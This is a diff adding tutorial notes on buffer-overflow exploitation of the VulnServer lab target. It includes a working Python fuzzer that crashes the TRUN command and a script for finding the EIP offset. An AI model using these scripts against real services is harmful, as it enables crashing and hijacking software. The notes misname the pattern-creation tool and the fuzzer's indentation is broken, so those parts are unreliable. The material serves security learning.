@@ -10,3 +10,67 @@
 - It is a process of probing an application to dicover which command or input are susceptible to buffer overflow.
 - generic_send_tcp is a tool used for spiking of buffer overflow to find a vulnerable command.
 	- generic_send_tcp host port spike_script 0 0 
+
+## Fuzzing
+- Fuzzing is the process of sending increasingly large amounts of data to the vulnerable command to find the exact buffer size that crashes the program.
+	- The code looks like this :
+		#!/usr/bin/env python3
+
+		import socket
+		import sys
+		from time import sleep
+
+		host = "***.**.***.***"   # Change to Windows VM IP
+		port = 9999
+
+		buffer = "A" * 100
+
+		while True:
+	    try:
+        print(f"[*] Sending {len(buffer)} bytes")
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+
+        s.connect((host, port))
+        s.recv(1024)  # Receive the application banner
+
+        s.sendall(("TRUN /.:/" + buffer + "\r\n").encode())
+
+        s.close()
+
+        buffer += "A" * 100
+        sleep(1)
+
+	    except Exception as e:
+        print(f"\n[!] Exception: {e}")
+        print(f"[!] crashed at approximately {len(buffer)} bytes")
+        sys.exit(0)
+
+		 
+
+## Finding the Offset
+- After finding the approximate buffer size that crashes the program , its needed to find the exact offset,the precise number of bytes required to overwrite the **EIP** (Extended Instruction Pointer).
+- The EIP is the register that tells the CPU where to execute the next instruction. If you can control EIP, you can redirect the program to your malicious code.
+	- To do so first you type :
+		- /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 this will produce a long string that we will use later.
+		- then we will run a python file that got a this code :
+			#!/usr/bin/env python3
+
+			import socket
+			import sys
+
+			offset = ""
+			try:
+			    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			    s.settimeout(3)
+			    s.connect(("172.16.199.131", 9999))
+			    s.recv(1024)  # Receive VulnServer banner
+			    s.sendall(("TRUN /.:/" + offset + "\r\n").encode())
+			    s.close()
+
+			except Exception as e:
+			    print(f"Error connecting to server: {e}")
+			    sys.exit()
+		- Inside the offset we add the string and the output will tell you the offset 
+		- e.g., "Exact match at offset 2003". This means the first 2003 bytes of your buffer go to the stack, and the next 4 bytes overwrite the EIP.
